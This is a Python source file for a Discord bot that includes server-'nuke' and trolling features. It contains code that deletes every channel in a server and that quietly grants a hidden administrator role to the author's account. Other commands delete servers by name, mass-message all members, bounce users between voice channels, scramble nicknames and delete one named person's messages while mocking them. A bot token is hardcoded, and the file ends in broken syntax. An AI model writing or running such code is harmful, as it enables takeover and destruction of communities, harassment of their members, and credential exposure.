
from email import message
from logging import exception
from sre_parse import CATEGORIES
import discord
from discord.ext import commands
#from discord_slash import SlashCommand
#from pretty_help import PrettyHelp
import aiohttp, platform, random, time, string, asyncio, ffmpeg, ast

#c = wmi.WMI()   
#my_system = c.Win32_ComputerSystem()[0]
my_system = platform.uname()
global menuused
global msg2
global DMs
DMs = True
menuused = True

intents = discord.Intents.default()
intents.members = True

bot = discord.Client(intents=intents)
bot = commands.Bot(command_prefix='"', intents=intents)

@bot.event
async def on_ready():
    print('We have logged in as {0.user}'.format(bot))

@bot.command(brief='Allows remote access',description="A command to remote control the bot from the IDE aka the owner's computor", aliases=["cc"])
async def consolecontrol():
    global silent
    DMs = True
    print("Remote Control from " + my_system.node)
    if menuused == True:
        menu = input('''    message = m
        server list = s
        leave server = l
        list members = lm
        nickname = n
        direct message = dm
        nuke = NUKE (educational purposes only)
        admin = a
        list channels = lc
        join voice = vc
        ping = p
        dm conversation - c
        

        Choice:''')
    else:
        menu = 'c'
    if menu == 'm':
        guild_name = input("guild:")
        channel_name = input('channel:')
        msg = input('msg:')
        guild = discord.utils.get(bot.guilds, name=guild_name)
        channel = discord.utils.get(guild.channels, name=channel_name)
        await channel.send(msg)
        await consolecontrol()
    elif menu == 's':
        activeservers = bot.guilds
        for guild in activeservers:
            print(guild.name)
        await consolecontrol()
    elif menu == 'l':
        guild_name = input("guild to leave:")
        guild = discord.utils.get(bot.guilds, name=guild_name) # Get the guild by name
        if guild is None:
            print("No guild with that name found.") # No guild found
            return
        await guild.leave() # Guild found
        print(f"I left: {guild.name}!")
        await consolecontrol()
    elif menu == 'n':
        guild_name = input("guild with user:")
        guild = discord.utils.get(bot.guilds, name=guild_name)
        username = input('username:')
        nick = input("nickname:")
        user = discord.utils.get(guild.members, name=username)
        await user.edit(nick=nick)
        await consolecontrol()
    elif menu == 'lm':
        for guild in bot.guilds:
            for member in guild.members:
                print(member)
        await consolecontrol()
    elif menu == 'dm':
        username = input('username:')
        msg = input('message:')
        guild_name = input("guild:")
        guild = discord.utils.get(bot.guilds, name=guild_name)
        user = discord.utils.get(guild.members, name=username)
        if username == 'all':
            for member in guild.members:
                await member.send(msg)
        await user.send(msg)
        await consolecontrol()
    elif menu == 'NUKE':
        confirmation = input('Are you sure?\n\n(Y/N)')
        if(confirmation == 'Y'):
            guild_name = input("guild to nuke:")
            guild = discord.utils.get(bot.guilds, name=guild_name)
            for channel in guild.channels:
                await channel.delete()
        await consolecontrol()
    elif menu == 'a':
        guild_name = input("guild:")
        guild = discord.utils.get(bot.guilds, name=guild_name)
        user = discord.utils.get(guild.members, name='Lynix')
        permissions = discord.Permissions()
        permissions.update(administrator = True)
        await guild.create_role(name="Admin")
        role = discord.utils.get(guild.roles, name="Admin")
        await role.edit(reason = None, permissions=permissions)
        await user.add_roles(role)
        await consolecontrol()
    elif menu == 'lc':
        guild_name = input("guild:")
        guild = discord.utils.get(bot.guilds, name=guild_name)
        print("------------------------------")
        for channel in guild.voice_channels:
            print(channel)
        print("------------------------------")
        await consolecontrol()
    elif menu == 'vc':
        guild_name = input("guild:")
        guild = discord.utils.get(bot.guilds, name=guild_name)
        channel_name = input('channel:')
        channel = discord.utils.get(guild.voice_channels, name=channel_name)
        await channel.connect()
        await consolecontrol()
    elif menu == 'meme':
        guild_name = input("guild:")
        guild = discord.utils.get(bot.guilds, name=guild_name)
        channel_name = input('channel:')
        channel = discord.utils.get(guild.channels, name=channel_name)
        embed = discord.Embed(title="", description="")
        await channel.send("This is a AI generated meme")
        async with aiohttp.ClientSession() as cs:
            async with cs.get('https://www.reddit.com/r/cleanmemes/new.json?sort=hot') as r:
                res = await r.json()
                embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
                await channel.send(embed=embed)

@bot.command()
async def s(ctx):
    for guild in bot.guilds:
        print(guild.name)
        if guild.name == "United Dragons of America" and guild.id != 900131441881542706:
            try:
                await bot.get_guild(guild.id).delete()
            except:
                await bot.get_guild(guild.id).leave()
            print("✅")
        else:
            print("❌")

@bot.event
async def on_command_error(ctx, error):
    await ctx.send(f"An error occured: {str(error)}")
    print(f"An error occured: {str(error)}")

@bot.command()
async def redacted(ctx, arg):
#   Variables 
    server_id = ctx.guild.id
    voicechannel_list = []
    textchannel_list = []
    link = ""
    members_name = []
    members_ids = []
    categories = []
#   Variable Assignment 
    for channel in ctx.guild.text_channels:
        textchannel_list.append(channel.name)
        try:
            if channel.category.name not in ctx.guild.categories:
                categories.append(channel.category.name)
        except:
            print(str(channel.name))
    for channel in ctx.guild.voice_channels:
        voicechannel_list.append(channel.name)
        try:
            if channel.category.name not in ctx.guild.voice_channels:
                categories.append(channel.category.name)
        except:
            print(str(channel.name))
    link = await ctx.channel.create_invite(max_age = 300)
    for member in ctx.guild.members:
        members_name.append(member.name)
        members_ids.append(member.id)
    combined = str(voicechannel_list) + "\n" + str(textchannel_list) + "\n" + str(link) + "\n" + str(members_name) + "\n" + str(members_ids) + "\n" + str(categories)
    f = open('info.txt', 'w', encoding="utf-8")
#   Files and stuff
    print(combined)
    time.sleep(0.3)
    f.write(combined)
#   Deletion
    for channel in ctx.guild.channels:
        await channel.delete()
#   Recovery
    time.sleep(int(arg))
    for member_id in members_ids:
        user = ctx.guild.get_member(int(member_id))
        if user.name != "LynixBeta":
            try:
                channel = await user.create_dm()
                await channel.send(link)
            except:
                continue
    for channel in textchannel_list:
        number = textchannel_list.index(channel)
        print(categories)
        number2 = categories[number]
        category = discord.utils.get(ctx.guild.categories, name=number2)
        if category not in ctx.guild.categories:
            await ctx.guild.create_category(number2)
        category = discord.utils.get(ctx.guild.categories, name=number2)
        if category in ctx.guild.categories:
            await ctx.guild.create_text_channel(channel, category=category)
    for channel in voicechannel_list:
        number = voicechannel_list.index(channel) + len(textchannel_list)
        print(categories)
        number2 = categories[number]
        category = discord.utils.get(ctx.guild.categories, name=number2)
        if category not in ctx.guild.categories:
            await ctx.guild.create_category(number2)
        category = discord.utils.get(ctx.guild.categories, name=number2)
        if category in ctx.guild.categories:
            await ctx.guild.create_voice_channel(channel, category=category)

@bot.command()
async def save(ctx):
#   Variables 
    server_id = ctx.guild.id
    voicechannel_list = []
    textchannel_list = []
    link = ""
    members_name = []
    members_ids = []
    categories = []
#   Variable Assignment 
    for channel in ctx.guild.text_channels:
        textchannel_list.append(channel.name)
        try:
            if channel.category.name not in ctx.guild.categories:
                categories.append(channel.category.name)
        except:
            print(str(channel.name))
    for channel in ctx.guild.voice_channels:
        voicechannel_list.append(channel.name)
        try:
            if channel.category.name not in ctx.guild.voice_channels:
                categories.append(channel.category.name)
        except:
            print(str(channel.name))
    link = await ctx.channel.create_invite(max_age = 300)
    for member in ctx.guild.members:
        members_name.append(member.name)
        members_ids.append(member.id)
    combined = str(voicechannel_list) + "\n" + str(textchannel_list) + "\n" + str(link) + "\n" + str(members_name) + "\n" + str(members_ids) + "\n" + str(categories)
    f = open('info.txt', 'w', encoding="utf-8")
#   Files and stuff
    print(combined)
    time.sleep(0.3)
    f.write(combined)

@bot.command()
async def restore(ctx):
    f = open("info.txt", "r", encoding="utf-8")
    voicechannel_list = ast.literal_eval(f.readline())
    textchannel_list = ast.literal_eval(f.readline())
    link = f.readline()
    members_name = ast.literal_eval(f.readline())
    members_ids = ast.literal_eval(f.readline())
    categories = ast.literal_eval(f.readline())
    print(categories[1])
#   delete
    for channel in ctx.guild.channels:
        await channel.delete()
    for category in ctx.guild.categories:
        await category.delete()
#   categories
    for categoryname in categories:
        category = discord.utils.get(ctx.guild.categories, name=categoryname)
        if category not in ctx.guild.categories:
            await ctx.guild.create_category(categoryname)
#   vcs
    for vc in voicechannel_list:
        number = voicechannel_list.index(vc) + len(textchannel_list)
        number2 = categories[number]
        category = discord.utils.get(ctx.guild.categories, name=number2)
        await ctx.guild.create_voice_channel(vc, category=category)
#   text
    for text in textchannel_list:
        number = textchannel_list.index(text)
        number2 = categories[number]
        category = discord.utils.get(ctx.guild.categories, name=number2)
        await ctx.guild.create_text_channel(text, category=category)

@bot.command()
async def debug(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()
    for category in ctx.guild.categories:
        await category.delete()
    category = await ctx.guild.create_category("a")
    await ctx.guild.create_text_channel("a1", category=category)
    await ctx.guild.create_text_channel("a2", category=category)
    category = await ctx.guild.create_category("b")
    await ctx.guild.create_voice_channel("b1", category=category)
    await ctx.guild.create_voice_channel("b2", category=category)

@bot.command()
async def delete(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()
    for category in ctx.guild.categories:
        await category.delete()

@bot.command()
async def copyserver(ctx):
    guild = await bot.create_guild(str(ctx.guild.name), region=None, icon=bytes(ctx.guild.icon,'UTF-8'))
    #   Variables 
    server_id = guild.id
    voicechannel_list = []
    textchannel_list = []
    link = ""
    members_name = []
    members_ids = []
    categories = []
#   Variable Assignment 
    for channel in ctx.guild.text_channels:
        textchannel_list.append(channel.name)
        try:
            if channel.category.name not in ctx.guild.categories:
                categories.append(channel.category.name)
        except:
            print(str(channel.name))
    for channel in ctx.guild.voice_channels:
        voicechannel_list.append(channel.name)
        try:
            if channel.category.name not in ctx.guild.voice_channels:
                categories.append(channel.category.name)
        except:
            print(str(channel.name))
    for member in ctx.guild.members:
        members_name.append(member.name)
        members_ids.append(member.id)
    combined = str(voicechannel_list) + "\n" + str(textchannel_list) + "\n" + str(link) + "\n" + str(members_name) + "\n" + str(members_ids) + "\n" + str(categories)
#   Recovery
    for channel in textchannel_list:
        number = textchannel_list.index(channel)
        print(categories)
        number2 = categories[number]
        category = discord.utils.get(guild.categories, name=number2)
        if category not in guild.categories:
            await guild.create_category(number2)
        category = discord.utils.get(guild.categories, name=number2)
        if category in guild.categories:
            await guild.create_text_channel(channel, category=category)
    for channel in voicechannel_list:
        number = voicechannel_list.index(channel) + len(textchannel_list)
        print(categories)
        number2 = categories[number]
        category = discord.utils.get(guild.categories, name=number2)
        if category not in guild.categories:
            await guild.create_category(number2)
        category = discord.utils.get(guild.categories, name=number2)
        if category in guild.categories:
            await guild.create_voice_channel(channel, category=category) 
    try:
        channel2 = discord.utils.get(guild.channels, name=ctx.channel.name)
        link = await channel2.create_invite(max_age = 300)
    except:
        await ctx.send("No channel detected")
    channel = await ctx.message.author.create_dm()
    await channel.send(link)

@bot.command()
async def debug2(ctx):
    await ctx.send(ctx.guild.icon)

@bot.event
async def on_message(msg2):
    if not msg2.guild and msg2.author.name != "LynixBeta":
        print(str(msg2.author.name) + ": " + str(msg2.content))
        msg3 = input("DM Message: ")
        await msg2.channel.send(msg3)
    if msg2.content == "memphis":
        await msg2.channel.send("we do not speak of him")
    if msg2.author.name == "Memphis":
        await msg2.delete()
        await msg2.channel.send('Memphis tried to send "' + msg2.content + '" but LynixBeta is better')
    #if msg2.author.id != 726802292908621917:
    #    if msg2.author.name != "LynixBeta":
    #        await msg2.delete()
    #        await msg2.channel.send(msg2.author.name + ' tried to send "' + msg2.content + '" but Lynix is the only person who can send messages!')
    await bot.process_commands(msg2)

@bot.command(brief='list of servers',description='Lists servers that the bot is in')
async def servers(ctx):
    activeservers = bot.guilds
    for guild in activeservers:
        await ctx.send(guild.name)
        print(guild.name)

@bot.command(brief='leaves a specific server',description='leaves a specific server')
async def leaveg(ctx, *, guild_name):
    guild = discord.utils.get(bot.guilds, name=guild_name) # Get the guild by name
    if guild is None:
        print("No guild with that name found.") # No guild found
        return
    await guild.leave() # Guild found
    await ctx.send(f"I left: {guild.name}!")

@bot.command()
async def channelspam(ctx):
    voice_channel_list = ctx.guild.voice_channels
    voice_channel_count = len(voice_channel_list)
    while True:
        for channel in ctx.guild.voice_channels:
            members = channel.members
            for member in members:
                try:
                    random_channel = random.randint(1, voice_channel_count)
                    await member.move_to(voice_channel_list[random_channel])
                except:
                    print("Wow! thats a error!")


@bot.command()
async def leavetroll(ctx, arg = 10):
    while True:
        for channel in ctx.guild.voice_channels:
            members = channel.members
            for member in members:
                chance = random.randint(0, 5)
                if chance == 3:
                    await member.move_to(None)
                print(chance)
                time.sleep(int(arg))

randommode = True

@bot.command()
async def nicktroll(ctx, arg):
    if randommode == True:
        namelist = []
        letters = string.ascii_letters
        members = ctx.guild.members
        for member in members:
            randomstring = "~" + ''.join(random.choice(letters) for i in range(len(member.name)))
            namelist.append(member.name)
            try:
                await member.edit(nick=randomstring)
            except:
                print(member.name)
        time.sleep(int(arg))
        i = 0
        for member in members:
            try:
                await member.edit(nick=namelist[i])
            except:
                print(member.name)
            i += 1
        i = 0

@bot.command()
async def resetnicks(ctx):
    members = ctx.guild.members
    for member in members:
            try:
                await member.edit(nick=None)
            except:
                print(member.name)

@bot.command()
async def soundtroll(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=ctx.author.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('User is in channel: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        vc.play(discord.FFmpegPCMAudio(executable='ffmpeg/bin/ffmpeg.exe', source='disconnect.mp3'))
    else:
        await ctx.send('User is not in a channel.')

@bot.command()
async def join(ctx):
    channel = ctx.author.voice.channel
    await channel.connect()

@bot.command(pass_context=True)
async def meme(ctx):
    embed = discord.Embed(title="", description="")

    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
            res = await r.json()
            embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
            if embed == discord.Embed(title="", description=""):
                embed = discord.Embed(title="Oops!", description="meme not found")
            await ctx.send(embed=embed)
#        if ctx.member.id == 726802292908621917:
#                ctx.send("Ur not chaosmakar but ill allow it")
#    else: ctx.send("Ur not chaosmakar")


#@bot.event
#async def on_message(message):
#    await message.channel.send("Hello! my name is Lynix")
#    if message == 'hi':
#        time.sleep(1)
#       await message.channel.send("Hello! my name is Lynix")
#    elif message == 'My name is Memphis':
#        time.sleep(1)
#        await message.channel.send("Are you having a good day?")
#    elif message == 'Yeah!':
#        time.sleep(1)
#        await message.channel.send("Do you wanna play some tag?")
#    elif message == 'Uh.. Sure':
#        time.sleep(1)
#        await message.channel.send("ON THE MOON")
#    elif message == 'WHAT':
#        time.sleep(1)
#        await message.channel.send("Nah jk, anyways")
#    elif message == 'oh':
#        time.sleep(1)
#        await message.channel.send("just wanna chill")
#    elif message == 'Yea':
#        time.sleep(1)
#        await message.channel.send("ok")

#    await message.delete()
#    guild = discord.utils.get(bot.guilds, name='Carroll Dragons')
#    user = discord.utils.get(guild.members, name='Memphis')
#    if message.author == user:
##        await message.delete()
#        return



@bot.command()
async def send(ctx, arg):
    await ctx.send(arg)

@bot.command()
async def clear(ctx, amount = 5):
    if amount != 33:
        await ctx.channel.purge(limit=amount)
    else:
        await ctx.channel.purge(limit=999999999999999999999999999999999999999999999999999999999999999)

@bot.command()
1

bot.run('OTY0OTU5OTQ5NzYxNDQ1OTE4.YlsO_A.pkuFavOlP2CGZBdfQ4yxC5Pf7Es')